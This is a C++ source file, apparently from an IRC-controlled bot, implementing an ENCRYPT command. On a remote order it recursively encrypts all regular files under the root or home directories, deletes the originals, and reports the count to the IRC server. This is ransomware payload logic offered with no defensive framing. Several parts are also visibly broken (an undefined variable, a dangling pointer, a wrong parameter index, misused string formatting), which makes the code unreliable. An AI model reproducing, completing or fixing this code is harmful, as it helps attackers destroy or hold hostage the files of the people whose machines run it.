#include "EncryptAction.hpp"
#include <filesystem>

namespace fs = std::filesystem;

bool isValidAlgorithm(const char* cString) {
    if (GeneralUtils::cStrAreEqual(cString, "AES-128")) {
        return true;
    } else if (GeneralUtils::cStrAreEqual(cString, "AES-192")) {
        return true;
    } else if (GeneralUtils::cStrAreEqual(cString, "AES-256")) {
        return true;
    }
    return false;
}

bool isValidStartDir(const char* cString) {
    if (GeneralUtils::cStrAreEqual(cString, "ROOT")) {
        return true;
    } else if (GeneralUtils::cStrAreEqual(cString, "HOME-ALL")) {
        return true;
    } else if (GeneralUtils::cStrAreEqual(cString, "HOME-USER")) {
        return true;
    }
    return false;
}

bool isValidCryptoType(const char* cString) {
    if (GeneralUtils::cStrAreEqual(cString, "DEC")) {
        return true;
    } else if (GeneralUtils::cStrAreEqual(cString, "ENC")) {
        return true;
    }
    return false;
}

std::string getParentDirectory(const std::string& path) {
    size_t pos = path.find_last_of("/\\");
    if (pos == std::string::npos || pos == 0) {
        return path;
    }
    return path.substr(0, pos);
}


EncryptAction::EncryptAction(std::vector<std::string> actionParams, IrcClient* ircClient) 
    : actionParams(actionParams), ircClient(ircClient) {
    this->checkParams();
}

ActionType EncryptAction::getActionType() {
    return ActionType::ENCRYPT;
}

void EncryptAction::execute() { 
    if (!isValid) {
        printf("isValid DID NOT PASS!\n");
        return;
    }
    const char* algo = actionParams[ALGO_IDX].c_str();
    this->isDecryption = GeneralUtils::cStrAreEqual(actionParams[START_DIR_IDX].c_str(), "DEC");
    fs::path startDir = determineStartDir(actionParams[START_DIR_IDX].c_str());
    CryptoManger cryptoManager(algo);
    this->cryptoManger = cryptoManager;

    std::string result = traverseFileSystem(startDir);
    ircClient->sendCommand(result);
}

char* EncryptAction::determineStartDir(const char* cString) {
    if (isDecryption) {
        return "/";
    }
    if (GeneralUtils::cStrAreEqual(cString, "ROOT")) {
        return "/";
    } else {
        const char* homeDir = std::getenv("HOME");
        if (homeDir) {
            if (GeneralUtils::cStrAreEqual(cString, "HOME-ALL")) {
                return getParentDirectory(std::string(homeDir)).c_str();
            } else if (GeneralUtils::cStrAreEqual(cString, "HOME-USER")) {
                return homeDir;
            }
        } else {
            return "/home";
        }
    }
}

std::string EncryptAction::traverseFileSystem(const fs::path& startDir) {
    try {
        if (!fs::exists(dirPath) || !fs::is_directory(dirPath)) {
            printf("Not a dir or doesnt exist\n");
            return std::string("Unable to encrypt/decrypt\n");
        } 
    } catch (const fs::filesystem_error& e) {
        std::cerr << "Filesystem error: " << e.what() << std::endl;
        return std::string("Unable to encrypt/decrypt\n");
    } catch (const std::exception& e) {
        std::cerr << "General error: " << e.what() << std::endl;
    }

    int count = 0;
    for (const auto& entry : fs::recursive_directory_iterator(startDir, fs::directory_options::skip_permission_denied)) {
        try {
            if (fs::is_regular_file(entry.status())) {
                if (entry.path().extension() != "irc_bot") { // TODO: change to actual executable file name
                    try {
                        if (isDecryption && entry.path().extension() == ".cry") {
                            cryptoManger.decryptFile(entry.path().string());
                        } else {
                            cryptoManger.encryptFile(entry.path().string());
                        }
                        fs::remove(entry.path());
                        count++;
                    } catch (const std::exception& e) {
                        continue;
                    }
                }
            }
        } catch (const fs::filesystem_error& e) {
            std::cerr << "Filesystem error: " << e.what() << " for path: " << entry.path().string() << std::endl;
        } catch (const std::exception& e) {
            std::cerr << "General error: " << e.what() << " for path: " << entry.path().string() << std::endl;
        }
    }
    if (isDecryption) {
        return std::string("%d file(s) decrypted", count);
    } 
    return std::string("%d file(s) encrypted", count);
} 

/*
    ENCRYPT Command Syntax:
        ENCRYPT <ENC_ALGORITHM> <ROOT|HOME-ALL|HOME-USER> <ENC|DEC>
*/
void EncryptAction::checkParams() {
    if (actionParams.size() - 3 != PARAM_COUNT) {
        isValid = false;
        return;
    }

    if (!GeneralUtils::cStrAreEqual(actionParams[COMMAND_TYPE_IDX].c_str(), "ENCRYPT")) {
        isValid = false;
        return;
    }

    if(!isValidAlgorithm(actionParams[ALGO_IDX].c_str())) {
        isValid = false;
        return;
    }

    if(!isValidStartDir(actionParams[START_DIR_IDX].c_str())) {
        isValid = false;
        return;
    }

    if (!isValidCryptoType(actionParams[CRYPTO_TYPE_IDX].c_str())) {
        isValid = false;
        return;
    }

    isValid = true;
}
